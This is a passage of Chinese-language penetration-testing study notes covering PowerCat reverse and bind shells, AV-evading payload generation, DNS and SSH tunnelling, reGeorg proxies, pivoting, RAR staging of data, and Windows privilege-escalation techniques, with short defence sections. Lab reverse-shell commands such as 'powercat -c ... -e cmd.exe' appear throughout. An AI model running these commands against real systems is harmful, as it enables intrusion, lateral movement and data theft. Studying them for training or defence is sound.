<li>在Windows7上运行下面命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c <span class="number">192.168</span>.<span class="number">56.129</span> -<span class="selector-tag">p</span> <span class="number">8888</span> -v -e cmd<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<p>注：在Windows下，-c 表示参数用户提供想要连接的IP地址</p>
<h4 id="3-5-通过PowerCat返回PowerShell"><a href="#3-5-通过PowerCat返回PowerShell" class="headerlink" title="3.5 通过PowerCat返回PowerShell"></a>3.5 通过PowerCat返回PowerShell</h4><p>​       前面的操作都是可以与nc进行交互的，但是，如果想要返回Powershell，则无法与nc进行交互。下面介绍让Windows7与Windows Server 2008建立正向连接。</p>
<ul>
<li>在Windows7下执行命令：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powecat -l -p 8080 –v</span><br></pre></td></tr></table></figure>

<ul>
<li>在Windows Server 2008下执行命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c <span class="number">192.168</span>.<span class="number">130.150</span> -<span class="selector-tag">p</span> <span class="number">8080</span> -v –ep</span><br></pre></td></tr></table></figure>

<p>注：-ep 参数用于返回PowerShell</p>
<h4 id="3-6-通过PowerCat传输文件"><a href="#3-6-通过PowerCat传输文件" class="headerlink" title="3.6 通过PowerCat传输文件"></a>3.6 通过PowerCat传输文件</h4><ul>
<li>Windows7下执行命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -<span class="selector-tag">p</span> <span class="number">8080</span> -of  c:\Users\ctfwin7\Desktop\flag.txt -v</span><br></pre></td></tr></table></figure>

<ul>
<li>Windows Server 2008下执行命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c <span class="number">192.168</span>.<span class="number">130.150</span> -<span class="selector-tag">p</span> <span class="number">8080</span> -<span class="selector-tag">i</span> c:\flag.txt -v</span><br></pre></td></tr></table></figure>

<p>上述命令的解释是：Windows Server 2008将文件c:\flag.txt通过端口8080传输给Windows7，Windows7将文件存放于c:\Users\ctfwin7\Desktop\下，</p>
<p>注：-i 输入；-of 输出文件名</p>
<h4 id="3-7-用PowerCat生成Payload（躲避杀软）"><a href="#3-7-用PowerCat生成Payload（躲避杀软）" class="headerlink" title="3.7 用PowerCat生成Payload（躲避杀软）"></a>3.7 用PowerCat生成Payload（躲避杀软）</h4><ul>
<li>Windows7下执行：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p <span class="number">8080</span> -e cmd -v -g &gt;&gt; shell.ps1   <span class="comment">//想反弹shell</span></span><br><span class="line">powercat -l -p <span class="number">8080</span> -ep -v -g &gt;&gt; shell.ps1      <span class="comment">//想反弹PowerShell</span></span><br></pre></td></tr></table></figure>

<ul>
<li>将生成的shell.ps1拿到Windows server 2008下执行：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shell.ps1</span><br></pre></td></tr></table></figure>

<ul>
<li>最后Windows7上执行下面命令即可获得反弹的shell</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c <span class="number">192.168</span>.<span class="number">130.100</span> -<span class="selector-tag">p</span> <span class="number">8000</span> -v</span><br></pre></td></tr></table></figure>

<p><strong>PS：</strong>也可以使用-ge生成编码后的脚本，然后直接使用powershell -e &lt;编码&gt;进行执行。</p>
<h4 id="3-8-PowerCat-DNS隧道"><a href="#3-8-PowerCat-DNS隧道" class="headerlink" title="3.8 PowerCat DNS隧道"></a>3.8 PowerCat DNS隧道</h4><p>​       PowerCat也是一套基于DNS通信，PowerCat的DNS的通信是基于dnscat设计的（其服务端就是dnscat）。</p>
<ul>
<li>在kali下下载安装dnscat（请百度）</li>
<li>kali下执行：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby dns2<span class="selector-class">.rb</span> ms08067<span class="selector-class">.test</span> -e open <span class="attr">--no-cache</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Windows7下执行以下命令后就可以在kali看到dnscat上反弹的Shell了。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c <span class="number">192.168</span>.<span class="number">227.129</span> -<span class="selector-tag">p</span> <span class="number">53</span> -dns ms08067<span class="selector-class">.test</span> -e cmd<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<p>注：-dns 表示使用DNS通信。</p>
<h4 id="3-9-将PowerCat作为跳板"><a href="#3-9-将PowerCat作为跳板" class="headerlink" title="3.9 将PowerCat作为跳板"></a>3.9 将PowerCat作为跳板</h4><p>将win7作为跳板，让Kali连接winserver2008。</p>
<ul>
<li>Windows server 2008下执行：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powercat -l -v -<span class="selector-tag">p</span> <span class="number">9999</span> -e cmd<span class="selector-class">.exe</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Windows 7下执行：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powercat -l -v -<span class="selector-tag">p</span> <span class="number">8000</span> -r tcp:<span class="number">192.168</span>.<span class="number">130.100</span>:<span class="number">9999</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Kali下执行：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">192.168</span>.<span class="number">227.161</span> <span class="number">8000</span> –vv</span><br></pre></td></tr></table></figure>

<p>最后，kali和win7进行连接，且win7就可以将流量转发给winserver2008了。</p>
<h2 id="四-应用层隧道技术"><a href="#四-应用层隧道技术" class="headerlink" title="四.应用层隧道技术"></a>四.应用层隧道技术</h2><p>应用层的隧道通信技术主要利用应用软件提供的端口发送数据。常用的隧道协议有SSH.HTTPS&#x2F;HTTPS与DNS。</p>
<h3 id="1-SSH隧道"><a href="#1-SSH隧道" class="headerlink" title="1. SSH隧道"></a>1. SSH隧道</h3><h4 id="1-1-SSH简介"><a href="#1-1-SSH简介" class="headerlink" title="1.1 SSH简介"></a>1.1 SSH简介</h4><ul>
<li><p>SSH 端口转发能够提供两大功能：</p>
<p>1.加密 SSH Client 端至 SSH Server 端之间的通讯数据。</p>
<p>2.突破防火墙的限制完成一些之前无法建立的 TCP 连接。</p>
</li>
<li><p>用户名密码登录原理</p>
<p>1.远程主机收到用户的登录请求，把自己的公钥发给用户</p>
<p>2.用户使用该公钥，将登录密码加密后，发送给远程主机。</p>
<p>3.远程主机用自己的私钥，解密登录密码，如果密码正确，就用户登录。</p>
</li>
</ul>
<p>在学习SSH隧道之前，先复习下SSH的配置文件吧。SSH的配置文件：&#x2F;etc&#x2F;ssh&#x2F;sshd_config，下面是一些安全加固的选项。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">AllowTcpForwarding <span class="built_in">yes</span>            <span class="comment">#是否允许转发TCP协议</span></span><br><span class="line">GatewayPorts <span class="built_in">yes</span>                  <span class="comment">#是否允许远程主机连接本地转发端口</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span>               <span class="comment">#是否允许root登录</span></span><br><span class="line">PasswordAuthentication <span class="built_in">yes</span>        <span class="comment">#是否允许使用基于密码的认证</span></span><br><span class="line">TCPKeepAlive <span class="built_in">yes</span>                  <span class="comment">#保持心跳,防止 ssh 断开</span></span><br></pre></td></tr></table></figure>

<h4 id="1-2-本地端口转发"><a href="#1-2-本地端口转发" class="headerlink" title="1.2 本地端口转发"></a>1.2 本地端口转发</h4><ul>
<li>测试环境：外部VPS可以访问内网Web服务器，但是不能访问数据库服务器；内网Web服务器和数据库服务器可以相互访问。</li>
<li>拓扑图：</li>
</ul>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111658041.png" alt="image-20220311165843923"></p>
<ul>
<li>渗透思路：以web服务器192.168.1.11为跳板，将内网数据库服务器1.1.1.10的3389端口映射到VPS机器192.168.1.10的2121端口，再次访问VPS的2121端口，就可以访问1.1.1.10的3389端口了。</li>
<li>在VPS上执行以下命令，会要求服务Web服务器（跳板机）的密码。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh –CfNg –L <span class="number">2121</span>（VPS端口）:<span class="number">1.1</span>.<span class="number">1.10</span>（目标主机IP）:<span class="number">3389</span>（目标端口） root@<span class="number">192.168</span>.<span class="number">1.11</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在VPS上访问1153端口后，就可以发现已经与数据库服务器1.1.1.10的3389端口建立了连接。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop <span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">1153</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一些参数解释：<ul>
<li>-C 压缩传输，加快传输速度。</li>
<li>-f 将SSH转入后台执行，不占用当前的shell。</li>
<li>-N 建立静默连接（建立了连接，但是看不到具体会话）。</li>
<li>-g 允许远程主机连接到本地用于转发的端口。</li>
<li>-L 本地端口转发。</li>
<li>-R 远程端口转发。</li>
<li>-D 动态转发（socks代理）。</li>
<li>-P 指定SSH端口。</li>
</ul>
</li>
</ul>
<h4 id="1-3-远程端口转发"><a href="#1-3-远程端口转发" class="headerlink" title="1.3 远程端口转发"></a>1.3 远程端口转发</h4><ul>
<li>测试环境：外部VPS不能访问内网Web服务器，但是Web服务器可以访问外网VPS，但是数据库服务器与域控都不能访问VPS。目标：通过外网VPS访问数据库服务器的3389端口。</li>
<li>拓朴图</li>
</ul>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111659186.png"></p>
<ul>
<li>渗透思路：以web服务器192.168.1.11为跳板，将VPS的3307端口的流量转发到1.1.1.10的3389端口，然后访问VPS的3307端口，就可以访问1.1.1.10的3307端口。</li>
<li>在web服务器1.1.1.116上执行如下命令：</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R <span class="number">3307</span>（VPS端口）:<span class="number">1.1</span>.<span class="number">1.10</span>（目标主机IP）:<span class="number">3389</span>（目标端口） root@<span class="number">192.168</span>.<span class="number">1.10</span></span><br></pre></td></tr></table></figure>

<ul>
<li>在本地访问VPS的端口3307，就可以发现已经与数据库服务器1.1.1.10的3389端口建立了连接。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop <span class="number">127.0</span>.<span class="number">0.1</span>：<span class="number">3307</span></span><br></pre></td></tr></table></figure>

<h4 id="1-4-动态转发"><a href="#1-4-动态转发" class="headerlink" title="1.4 动态转发"></a>1.4 动态转发</h4><p>动态端口映射就是建立一个SSH加密的SOCKS 4&#x2F;5代理通道，任何支持SOCKS 4&#x2F;5协议的程序都可以使用这个加密通道进行代理访问。</p>
<ul>
<li>拓朴图</li>
</ul>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203111659801.png"></p>
<ul>
<li>在VPS上执行下面命令后，再输入Web服务器的密码。</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D <span class="number">7000</span> root<span class="keyword">@192</span>.168.1.11</span><br></pre></td></tr></table></figure>

<ul>
<li>在本地打开浏览器。设置网络代理，设置SOCKS host为127.0.0.1，Port为7000。最后通过浏览器访问内网域控制器1.1.1.2。</li>
<li>本地主机查看SSH进程正在监听7000端口：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat tunpl | grep <span class="string">&quot;:7000&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="1-5-防御SSH隧道攻击的思路"><a href="#1-5-防御SSH隧道攻击的思路" class="headerlink" title="1.5 防御SSH隧道攻击的思路"></a>1.5 防御SSH隧道攻击的思路</h4><p>SSH隧道之所以被利用，主要是因为系统的访问控制措施还不够，可以从以下几点来防御SSH隧道攻击。</p>
<ul>
<li>在系统中设置SSH远程访问控制白名单，在ACL中限制只允许特定的IP地址才能连接SSH，系统设置完全带外管理等。</li>
<li>内网限制SSH远程登录的地址与双向访问控制策略。</li>
</ul>
<h3 id="2-HTTP-x2F-HTTPS协议"><a href="#2-HTTP-x2F-HTTPS协议" class="headerlink" title="2. HTTP&#x2F;HTTPS协议"></a>2. HTTP&#x2F;HTTPS协议</h3><h4 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h4><p>HTTP Service代理用于将所有的流量转发到内网，常见的代理工具有reGeorg.meterpreter.tunna等。</p>
<p>reGeory的特征非常明显。reGeory支持ASPX.PHP.JSP等Web脚本。</p>
<h4 id="2-2-攻击步骤："><a href="#2-2-攻击步骤：" class="headerlink" title="2.2 攻击步骤："></a>2.2 攻击步骤：</h4><p>1.将脚本文件上传至目标服务器中，使用Kali 在本地访问远程服务器上的脚本文件，返回后，利用reGeorySocksProxy.py脚本监听本地的端口，即可建立一个通信链路。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorySocksProxy.py -u http:<span class="comment">//远程服务器IP：8080/tunnel.jsp -p 9999(本地端口)</span></span><br></pre></td></tr></table></figure>

<p>隧道正常工作后，可以在本地kali 机器上使用ProxyChains之类的工具，访问目标内网中的资源。</p>
<h4 id="2-3-防御"><a href="#2-3-防御" class="headerlink" title="2.3 防御"></a>2.3 防御</h4><p>严格监控http隧道的情况，及时发现问题。</p>
<h3 id="3-DNS协议"><a href="#3-DNS协议" class="headerlink" title="3. DNS协议"></a>3. DNS协议</h3><h4 id="3-1-DNS隧道简介"><a href="#3-1-DNS隧道简介" class="headerlink" title="3.1 DNS隧道简介"></a>3.1 DNS隧道简介</h4><p>用户管理僵尸网络和进行APT攻击的服务器叫做C&amp;C服务器（Command and Control Server，命令及控制服务器）。C&amp;C节点分为两中种，一种是C&amp;C服务端（攻击者），另一种是C&amp;C客户端（被控制的计算机）。C&amp;C通信是指植入C&amp;C客户端的木马或者后门程序与C&amp;C服务端上的远程控制程序之间的通信。</p>
<p>DNS隧道的工作原理很简单：在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果，如果互联网上有一台定制的服务器，那么依靠DNS协议就可以进行数据包的交换，从DNS协议的角度来看，这样的操作只是一次次地查询某个特定的域名并且得到解析结果，但其本质的问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。简单地说，就是将其他协议封装在DNS协议中进行传输。</p>
<h4 id="3-2-常用工具及攻击过程"><a href="#3-2-常用工具及攻击过程" class="headerlink" title="3.2 常用工具及攻击过程"></a>3.2 常用工具及攻击过程</h4><ul>
<li>dnscat2<ul>
<li>在VPS上部署域名解析</li>
<li>在VPS上安装dnscat2服务端</li>
<li>在目标主机上安装客户端</li>
<li>反弹shell</li>
</ul>
</li>
<li>iodine</li>
</ul>
<h4 id="3-3-防御DNS隧道攻击的方法"><a href="#3-3-防御DNS隧道攻击的方法" class="headerlink" title="3.3 防御DNS隧道攻击的方法"></a>3.3 防御DNS隧道攻击的方法</h4><ul>
<li>禁止网络中的任何人向外部服务器发送DNS请求，只允许与受信任的DNS服务器通信。</li>
<li>将邮件服务器&#x2F;网关列入白名单并阻止传入和传出的流量中的txt请求。</li>
<li>跟踪用户的DNS查询次数。</li>
<li>阻止ICMP。</li>
</ul>
<h2 id="五-SOCKS代理"><a href="#五-SOCKS代理" class="headerlink" title="五.SOCKS代理"></a>五.SOCKS代理</h2><h3 id="1-SOCKS代理简介"><a href="#1-SOCKS代理简介" class="headerlink" title="1. SOCKS代理简介"></a>1. SOCKS代理简介</h3><p>SOCKS是一种代理服务，可以将一端的系统连接到另一端。SOCKS支持多种协议，包括HTTP.FTP等。SOCKS分为 SOCKS4 与 SOCK5 两种类型：SOCKS4 只支持TCP协议；SOCKS5 不仅支持TCP&#x2F;UDP协议，还支持多种身份验证机制等，其标准端口号为1080。SOCKS能与目标内网计算机进行通信，避免多次端口转发。</p>
<p>SOCKS代理可以理解为增强版的lcx。它在服务端监听一个服务端口。当有新的连接请求出现时，会先从SOCKS协议中解析目标的URL的目标端口，再执行lcx的具体功能。</p>
<p><strong>正向代理简单来说就是主动通过代理去访问目标服务器，反向代理是指目标服务器通过代理来主动连接。</strong></p>
<h3 id="2-常用的SOCKS工具"><a href="#2-常用的SOCKS工具" class="headerlink" title="2. 常用的SOCKS工具"></a>2. 常用的SOCKS工具</h3><ul>
<li>EarthWorm（EW）<ul>
<li>正向代理</li>
<li>反向代理</li>
</ul>
</li>
<li>reGeory</li>
<li>sSocks</li>
<li>SocksCap64</li>
<li>Proxifier</li>
<li>ProxyChanis</li>
</ul>
<h2 id="六-压缩数据"><a href="#六-压缩数据" class="headerlink" title="六.压缩数据"></a>六.压缩数据</h2><h3 id="1-RAR"><a href="#1-RAR" class="headerlink" title="1. RAR"></a>1. RAR</h3><h4 id="1-1-以rar格式压缩-x2F-解压"><a href="#1-1-以rar格式压缩-x2F-解压" class="headerlink" title="1.1 以rar格式压缩&#x2F;解压"></a>1.1 以rar格式压缩&#x2F;解压</h4><p>将E:\webs\目录下的所有内容打包为1.rar放入E:\webs\目录下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar<span class="selector-class">.exe</span> <span class="selector-tag">a</span> -k -r -s -m3 E:\webs\<span class="number">1</span>.rar E:\webs\</span><br></pre></td></tr></table></figure>

<p>将E:\webs\1.rar解压到当前根目录下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar<span class="selector-class">.exe</span> e E:\webs\<span class="number">1</span>.rar</span><br></pre></td></tr></table></figure>

<p>注：参数 e 表示解压到当前根目录下。 x 表示以绝对路径解压。</p>
<h4 id="1-2-分卷压缩-x2F-解压"><a href="#1-2-分卷压缩-x2F-解压" class="headerlink" title="1.2 分卷压缩&#x2F;解压"></a>1.2 分卷压缩&#x2F;解压</h4><p>分卷压缩E盘API目录下的所有文件及文件夹，设置每个分卷为20M</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar<span class="selector-class">.exe</span> <span class="selector-tag">a</span> -m0 -r -v20m E:\test.rar E:\API</span><br></pre></td></tr></table></figure>

<p>将E:\test.part01.rar解压到E盘的x1目录下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rar<span class="selector-class">.exe</span> x E:\test.part01.rar E:\x1</span><br></pre></td></tr></table></figure>

<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3><h3 id="2-7-Zip"><a href="#2-7-Zip" class="headerlink" title="2. 7-Zip"></a>2. 7-Zip</h3><h2 id="七-文件上传与下载"><a href="#七-文件上传与下载" class="headerlink" title="七.文件上传与下载"></a>七.文件上传与下载</h2><h3 id="1-利用FTP上传"><a href="#1-利用FTP上传" class="headerlink" title="1. 利用FTP上传"></a>1. 利用FTP上传</h3><h3 id="2-利用VBS上传"><a href="#2-利用VBS上传" class="headerlink" title="2. 利用VBS上传"></a>2. 利用VBS上传</h3><h3 id="3-利用Debug上传"><a href="#3-利用Debug上传" class="headerlink" title="3. 利用Debug上传"></a>3. 利用Debug上传</h3><h3 id="4-利用Nishang上传"><a href="#4-利用Nishang上传" class="headerlink" title="4. 利用Nishang上传"></a>4. 利用Nishang上传</h3><p>Nishang是一个Powershell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。Nishang被广泛应用于渗透测试的各个阶段。</p>
<h3 id="5-利用bitsadmin下载"><a href="#5-利用bitsadmin下载" class="headerlink" title="5. 利用bitsadmin下载"></a>5. 利用bitsadmin下载</h3><h3 id="6-利用Powershell下载"><a href="#6-利用Powershell下载" class="headerlink" title="6. 利用Powershell下载"></a>6. 利用Powershell下载</h3><h2 id="八-一些渗透常用的工具"><a href="#八-一些渗透常用的工具" class="headerlink" title="八.一些渗透常用的工具"></a>八.一些渗透常用的工具</h2><p>nps</p>
<p>frp</p>
<p>reGeory</p>
<p>Proxifier</p>
<p>ProxyChanis</p>
<p>nc</p>
<p>lcx</p>
<h1 id="权限提升和防御"><a href="#权限提升和防御" class="headerlink" title="权限提升和防御"></a>权限提升和防御</h1><p><strong>windows中权限大概分为四种</strong>：</p>
<ul>
<li>User：普通用户权限</li>
<li>Administrator：管理员权限（可利用Windows机制将自己提升为System权限）</li>
<li>System：系统权限，可以对SAM等敏感文件进行读取</li>
<li>TrustedInstaller：Windows中的最高权限，可以修改系统文件</li>
</ul>
<p><strong>Windows常用提权方式：</strong></p>
<ul>
<li>纵向提权</li>
<li>横向提权</li>
</ul>
<p><strong>Windows常用提权方法：</strong></p>
<ul>
<li><p>系统内核溢出漏洞提权</p>
</li>
<li><p>数据库提权</p>
</li>
<li><p>错误的系统配置提权</p>
</li>
<li><p>组策略首选项提权</p>
</li>
<li><p>Web中间件漏洞提权</p>
</li>
<li><p>DLL劫持提权</p>
</li>
<li><p>滥用高权限令牌提权</p>
</li>
<li><p>第三方软件&#x2F;服务提权</p>
</li>
</ul>
<h2 id="一：系统内核溢出漏洞提权分析及防范"><a href="#一：系统内核溢出漏洞提权分析及防范" class="headerlink" title="一：系统内核溢出漏洞提权分析及防范"></a>一：系统内核溢出漏洞提权分析及防范</h2><h3 id="1-基本流程"><a href="#1-基本流程" class="headerlink" title="1.基本流程"></a>1.基本流程</h3><p>查询系统已安装补丁：</p>
<p>systeminfo</p>
<p>wmic qfe get Caption,Description,HotFixID,InstalledOn<br>将补丁编号与提权的EXP编号进行对比<br>查找并利用项管EXP</p>
<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/image-20220310175959204.png" alt="image-20220310175959204"></p>
<h3 id="2-其它工具"><a href="#2-其它工具" class="headerlink" title="2.其它工具"></a>2.其它工具</h3><p>metasploit中的post&#x2F;windows&#x2F;gather&#x2F;enum_patches<br>Windows Exploit Suggester<br>PowerShell中的Sherlock脚本</p>
<h2 id="二：-Windows操作系统配置错误"><a href="#二：-Windows操作系统配置错误" class="headerlink" title="二： Windows操作系统配置错误"></a>二： Windows操作系统配置错误</h2><h3 id="1-系统服务权限配置错误"><a href="#1-系统服务权限配置错误" class="headerlink" title="1.系统服务权限配置错误"></a>1.系统服务权限配置错误</h3><p>Windows系统服务文件在操作系统启动时加载和执行，并在后台调用可执行文件。因此，如果一个低权限的用户对此类系统服务调用的可执行文件拥有写权限，就可以将该文件替换成任意可执行文件，并随着系统服务的启动获得系统权限。Windows服务是以System权限运行的，因此，其文件夹.文件和注册表键值都是受强访问控制机制保护的。但是，在某些情况下，操作系统中仍然存在一些没有得到有效保护的服务。</p>
<p>系统服务权限配置错误有如下两种可能：</p>
<p>服务未运行：使用任意服务替换原来的服务，然后重启服务<br>服务正在运行且无法被终止：利用DLL劫持技术并尝试重启服务来提权<br>工具：</p>
<p>PowerUp<br>metasploit中的service_permissions</p>
<h3 id="2-注册表键值AlwaysInstalledElevated"><a href="#2-注册表键值AlwaysInstalledElevated" class="headerlink" title="2.注册表键值AlwaysInstalledElevated"></a>2.注册表键值AlwaysInstalledElevated</h3><p>注册表键值AlwayaInstalledElevated是一个策略设置项。Windows允许低权限用户以System权限运行安装文件。如果启用此策略设置项，那么任何权限的用户都能以NT AUTHORITY\SYSTEM权限来安装恶意的MSI文件。该漏洞产生的原因是用户开启了Windows Installer特权安装功能。<br>Windows Installer是Windows操作系统的组件之一，专门用来管理和配置软件服务。Windows Installer除了是一个安装程序，还用于管理软件的安装.管理软件组件的添加和删除.监视文件的还原.通过回滚进行灾难恢复等<br>Windows Installer分为客户端安装服务（Msiexec.exe）和MSI文件两部分，它们是一起工作的。Windows Installer通过Msiexec.exe安装MSI文件包含的程序。MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件时需要使用大量指令和数据。Msiexec.exe用于安装MSI文件，一般在运行Microsoft Update安装更新或者安装一些软件的时候使用，占用内存较多。简单说，双击MSI文件就会运行Msiexec.exe。</p>
<p>工具</p>
<p>PowerUp的Get-RegistryAlwaysInstallElevated模块<br>metasploit的exploit&#x2F;windows&#x2F;local&#x2F;always_install_elevated模块</p>
<h3 id="3-可信任服务路径漏洞"><a href="#3-可信任服务路径漏洞" class="headerlink" title="3.可信任服务路径漏洞"></a>3.可信任服务路径漏洞</h3><p>Windows服务通常都是以System权限运行的，所以系统在解析服务对应的文件路径中的空格时，也会也会以系统权限运行。<br>例如，一个文件路径C:\Program Files\Some Folder\Service.exe，对于路径中的每一个空格，Windows都会尝试寻找并执行与空格前面的名字相匹配的程序。操作系统会对文件路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。在本例中，Windows会一次尝试确定和执行下列程序：</p>
<p>C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe<br>因此，如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。<br>1.检测漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:Windows\\&quot;</span> |findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>


<p>2.漏洞利用</p>
<p>使用icacls检测是否具有写权限icacls “c:\program File\program folder”<br>metasploit的windows service trusted path privilege escalation模块</p>
<h3 id="4-自动安装配置文件"><a href="#4-自动安装配置文件" class="headerlink" title="4.自动安装配置文件"></a>4.自动安装配置文件</h3><p>网络管理员在内网中给多台机器配置同一个环境时，通常会使用脚本批量部署。在这一过程中，会使用安装配置文件，这些文件中可能还包含本地管理员账号和密码信息。<br>查找这些文件，并搜寻其信息。</p>
<h3 id="5-计划任务"><a href="#5-计划任务" class="headerlink" title="5.计划任务"></a>5.计划任务</h3><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序。这样，在计划任务下次执行时，就会以高权限来运行恶意程序。</p>
<p>1.查看计划任务</p>
<p>schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</p>
<p>2.使用AccessChk查看目录配置情况,看有没有高权限的。</p>
<h3 id="6-Empire内置模块"><a href="#6-Empire内置模块" class="headerlink" title="6.Empire内置模块"></a>6.Empire内置模块</h3><p>AllCheck模块</p>
<h2 id="三：组策略首选项提权分析及防范"><a href="#三：组策略首选项提权分析及防范" class="headerlink" title="三：组策略首选项提权分析及防范"></a>三：组策略首选项提权分析及防范</h2><p>管理员在域中新建一个组策略后，操作系统会自动在SYSVOL共享目录中生成一个XML文件，该文件中保存了该组策略更新后的密码。该密码使用AES-256加密算法。</p>
<h3 id="1-工具"><a href="#1-工具" class="headerlink" title="1.工具"></a>1.工具</h3><p>PowserSploit的Get-GPPPassword.ps1<br>Metasploit的post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp<br>empire的privesc&#x2F;gpp</p>
<h3 id="2-防御措施"><a href="#2-防御措施" class="headerlink" title="2.防御措施"></a>2.防御措施</h3><p>更新KB2962486补丁<br>设置SYSVOL访问权限<br>将包含组策略密码的XML文件删除<br>不要把密码文件放在所有域用户都有权访问的文件中</p>
<h2 id="四：绕过UAC提权分析及防范"><a href="#四：绕过UAC提权分析及防范" class="headerlink" title="四：绕过UAC提权分析及防范"></a>四：绕过UAC提权分析及防范</h2><p>UAC（USer Account Control，用户账户控制）要求用户在执行可能影响计算机运行的操作或者在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证。<br>UAC有如下四种设置：</p>
<p>始终通知<br>仅在程序试图更改我的计算机时通知我（默认设置，当Windows程序要使用更高级别权限时，不会通知用户。但是当第三方程序要求更高级别的权限时，会提示本地用户）<br>仅在程序试图更改我的计算机时通知我（不降低桌面亮度）<br>从不提示<br>1.工具</p>
<p>metasploit的exploit&#x2F;windows&#x2F;local&#x2F;bypassuac模块<br>metasploit的exploit&#x2F;windows&#x2F;local&#x2F;ask模块<br>Nishang中的invoke-PsUACme模块<br>Empire的bypassuac模块</p>
